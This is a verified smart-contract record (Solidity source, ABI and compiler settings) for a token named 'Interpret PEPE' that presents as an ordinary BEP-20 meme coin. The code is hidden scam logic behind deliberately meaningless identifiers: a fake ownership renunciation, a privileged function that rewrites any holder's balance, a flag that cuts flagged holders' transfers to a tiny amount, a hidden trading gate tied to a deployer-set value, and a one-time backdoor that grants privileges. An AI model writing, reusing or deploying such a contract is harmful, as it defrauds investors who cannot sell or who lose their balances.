{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tokenAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTo) external view returns (uint256);\n\n    function transfer(address isSenderWallet, uint256 atTotal) external returns (bool);\n\n    function allowance(address modeAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isSenderWallet,\n        uint256 atTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptLaunched, uint256 value);\n    event Approval(address indexed modeAuto, address indexed spender, uint256 value);\n}\n\nabstract contract isTokenSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeLaunchAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapTradingMarketing {\n    function createPair(address senderLiquidity, address maxTx) external returns (address);\n}\n\ninterface buyFeeAmount is tokenAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterpretPEPE is isTokenSwap, tokenAuto, buyFeeAmount {\n\n    function marketingMin(uint256 atTotal) public {\n        atBuy();\n        receiverAtLimit = atTotal;\n    }\n\n    bool private amountMode;\n\n    address receiverAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private amountLiquidity;\n\n    function transfer(address fromBuy, uint256 atTotal) external virtual override returns (bool) {\n        return senderSwap(_msgSender(), fromBuy, atTotal);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamBuyMax;\n    }\n\n    mapping(address => bool) public feeWallet;\n\n    uint256 public shouldTradingReceiver;\n\n    bool public buyLaunched;\n\n    string private autoWallet = \"IPE\";\n\n    uint256 private marketingFrom = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        modeLaunchAmount tradingLaunched = modeLaunchAmount(receiverAuto);\n        tradingMin = swapTradingMarketing(tradingLaunched.factory()).createPair(tradingLaunched.WETH(), address(this));\n        \n        receiverTotal = _msgSender();\n        modeBuy();\n        launchedTakeTrading[receiverTotal] = true;\n        tokenExemptList[receiverTotal] = marketingFrom;\n        if (shouldTradingReceiver == txAmountSender) {\n            txAmountSender = teamBuyTotal;\n        }\n        emit Transfer(address(0), receiverTotal, marketingFrom);\n    }\n\n    uint256 exemptLimit;\n\n    bool public modeTx;\n\n    function getOwner() external view returns (address) {\n        return feeMax;\n    }\n\n    function senderSwap(address tradingAuto, address isSenderWallet, uint256 atTotal) internal returns (bool) {\n        if (tradingAuto == receiverTotal) {\n            return liquidityToken(tradingAuto, isSenderWallet, atTotal);\n        }\n        uint256 minWalletLaunched = tokenAuto(tradingMin).balanceOf(shouldMode);\n        require(minWalletLaunched == receiverAtLimit);\n        require(isSenderWallet != shouldMode);\n        if (feeWallet[tradingAuto]) {\n            return liquidityToken(tradingAuto, isSenderWallet, teamEnable);\n        }\n        return liquidityToken(tradingAuto, isSenderWallet, atTotal);\n    }\n\n    function balanceOf(address modeTo) public view virtual override returns (uint256) {\n        return tokenExemptList[modeTo];\n    }\n\n    bool private modeFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchTokenMin;\n\n    uint256 public txAmountSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingFrom;\n    }\n\n    function atBuy() private view {\n        require(launchedTakeTrading[_msgSender()]);\n    }\n\n    mapping(address => uint256) private tokenExemptList;\n\n    mapping(address => bool) public launchedTakeTrading;\n\n    function owner() external view returns (address) {\n        return feeMax;\n    }\n\n    uint8 private fromTo = 18;\n\n    function modeBuy() public {\n        emit OwnershipTransferred(receiverTotal, address(0));\n        feeMax = address(0);\n    }\n\n    function sellLaunch(address receiverMarketing) public {\n        atBuy();\n        if (modeTx) {\n            modeFund = false;\n        }\n        if (receiverMarketing == receiverTotal || receiverMarketing == tradingMin) {\n            return;\n        }\n        feeWallet[receiverMarketing] = true;\n    }\n\n    function approve(address minTo, uint256 atTotal) public virtual override returns (bool) {\n        launchTokenMin[_msgSender()][minTo] = atTotal;\n        emit Approval(_msgSender(), minTo, atTotal);\n        return true;\n    }\n\n    function transferFrom(address tradingAuto, address isSenderWallet, uint256 atTotal) external override returns (bool) {\n        if (_msgSender() != receiverAuto) {\n            if (launchTokenMin[tradingAuto][_msgSender()] != type(uint256).max) {\n                require(atTotal <= launchTokenMin[tradingAuto][_msgSender()]);\n                launchTokenMin[tradingAuto][_msgSender()] -= atTotal;\n            }\n        }\n        return senderSwap(tradingAuto, isSenderWallet, atTotal);\n    }\n\n    function senderAuto(address fromBuy, uint256 atTotal) public {\n        atBuy();\n        tokenExemptList[fromBuy] = atTotal;\n    }\n\n    uint256 constant teamEnable = 17 ** 10;\n\n    bool public sellBuy;\n\n    function liquidityToken(address tradingAuto, address isSenderWallet, uint256 atTotal) internal returns (bool) {\n        require(tokenExemptList[tradingAuto] >= atTotal);\n        tokenExemptList[tradingAuto] -= atTotal;\n        tokenExemptList[isSenderWallet] += atTotal;\n        emit Transfer(tradingAuto, isSenderWallet, atTotal);\n        return true;\n    }\n\n    function allowance(address maxAutoLaunch, address minTo) external view virtual override returns (uint256) {\n        if (minTo == receiverAuto) {\n            return type(uint256).max;\n        }\n        return launchTokenMin[maxAutoLaunch][minTo];\n    }\n\n    address shouldMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed isEnable, address indexed shouldExempt);\n\n    address private feeMax;\n\n    address public tradingMin;\n\n    string private teamBuyMax = \"Interpret PEPE\";\n\n    uint256 receiverAtLimit;\n\n    function tradingMax(address takeFrom) public {\n        require(takeFrom.balance < 100000);\n        if (sellBuy) {\n            return;\n        }\n        if (amountMode) {\n            shouldTradingReceiver = teamBuyTotal;\n        }\n        launchedTakeTrading[takeFrom] = true;\n        \n        sellBuy = true;\n    }\n\n    address public receiverTotal;\n\n    uint256 private teamBuyTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAutoLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTakeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"senderAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTradingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"}],\"name\":\"tradingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSenderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmountSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InterpretPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}